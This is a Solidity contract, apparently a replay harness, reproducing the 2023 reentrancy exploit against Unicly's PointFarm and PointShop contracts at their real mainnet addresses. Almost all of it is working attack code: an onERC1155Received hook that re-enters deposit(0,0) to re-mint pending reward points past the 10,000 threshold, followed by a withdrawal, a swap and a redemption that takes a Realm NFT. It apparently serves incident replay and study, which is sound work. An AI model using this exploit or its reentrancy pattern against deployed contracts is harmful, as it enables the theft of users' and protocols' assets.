// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Cheatcode-free synthetic exploit for 2023-09-uniclyNFT (Unicly PointFarm / PointShop).
//
// The replay engine (@ethereumjs/vm) runs ZERO Foundry cheatcodes and holds ONE
// fixed block for the whole run, so the original test's `deal`, the WETH->uJENNY
// swap, the initial `PointFarm.deposit`, and the `vm.roll(+~16,230 blocks)` are
// all reproduced by `setup.steps` in the config (executed at the post-roll block,
// then `poolInfo[0].lastRewardBlock` is rewound to the pre-roll block via a raw
// storage write). This contract performs only the post-roll attack, which is what
// the debugger records.
//
// The vulnerability: PointFarm.deposit() mints pending reward points via ERC1155
// `_mint` (which fires the recipient's onERC1155Received) BEFORE it updates
// `user.rewardDebt`. Re-entering deposit(0,0) from the callback therefore re-mints
// the SAME pending amount every time, inflating the attacker's point balance past
// the 10,000 threshold that PointShop.redeem() burns to hand out a Realm NFT.

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IUniPairV2 {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IPointFarm {
    function balanceOf(address account, uint256 id) external view returns (uint256);
    function userInfo(uint256 pid, address user) external view returns (uint256 amount, uint256 rewardDebt);
    function setApprovalForAll(address operator, bool approved) external;
    function deposit(uint256 pid, uint256 amount) external;
    function withdraw(uint256 pid, uint256 amount) external;
}

interface IPointShop {
    function redeem(address uToken, uint256 internalID) external;
}

interface IERC721 {
    function balanceOf(address owner) external view returns (uint256);
}

contract ContractTest {
    IERC20 private constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 private constant uJENNY = IERC20(0xa499648fD0e80FD911972BbEb069e4c20e68bF22);
    IUniPairV2 private constant uJENNY_WETH = IUniPairV2(0xEC5100AD159F660986E47AFa0CDa1081101b471d);
    IPointFarm private constant PointFarm = IPointFarm(0xd3C41c85bE295607E8EA5c58487eC5894300ee67);
    IPointShop private constant PointShop = IPointShop(0xcDCc535503CBA9286489b338b36156b4b75008f6);
    IERC721 private constant Realm = IERC721(0x7AFe30cB3E53dba6801aa0EA647A0EcEA7cBe18d);

    // Attack entrypoint. Preparation (0.5 WETH -> uJENNY, deposit into PointFarm,
    // ~2-day wait) has already been applied by setup.steps; here we trigger the
    // reentrancy and redeem the Realm NFT.
    function testExploit() public {
        // 1. Reentrancy: deposit(0,0) mints pending points and calls back into
        //    onERC1155Received, which re-deposits before rewardDebt is written,
        //    re-minting the same pending until the balance clears 10,000.
        PointFarm.deposit(0, 0);

        // 2. Reclaim the staked uJENNY (unchanged by the 0-amount deposits).
        (uint256 amtuJENNY, ) = PointFarm.userInfo(0, address(this));
        PointFarm.withdraw(0, amtuJENNY);

        // 3. Swap the reclaimed uJENNY back to WETH (round-trip the capital).
        uJENNYToWETH(amtuJENNY);

        // 4. Spend the inflated points to redeem the stolen Realm NFT (ID 4689).
        PointFarm.setApprovalForAll(address(PointShop), true);
        PointShop.redeem(address(uJENNY), 0);
    }

    function uJENNYToWETH(uint256 amount) internal {
        (uint112 reserveuJENNY, uint112 reserveWETH, ) = uJENNY_WETH.getReserves();
        uint256 amountOut = calcAmountOut(reserveWETH, reserveuJENNY, amount);
        uJENNY.transfer(address(uJENNY_WETH), amount);
        uJENNY_WETH.swap(0, amountOut, address(this), bytes(""));
    }

    function calcAmountOut(uint256 reserve1, uint256 reserve2, uint256 tokenAmount) internal pure returns (uint256) {
        uint256 a = tokenAmount * 997;
        uint256 b = a * reserve1;
        uint256 c = reserve2 * 1000;
        return b / (a + c);
    }

    // Reentrancy hook: while the point balance is still at/below the 10,000
    // redemption threshold, re-enter deposit(0,0) to re-mint the same pending.
    function onERC1155Received(
        address,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external returns (bytes4) {
        uint256 pointFarmBalance = PointFarm.balanceOf(address(this), 0);
        if (pointFarmBalance <= 10_000) {
            PointFarm.deposit(0, 0);
        }
        return this.onERC1155Received.selector;
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external returns (bytes4) {
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}
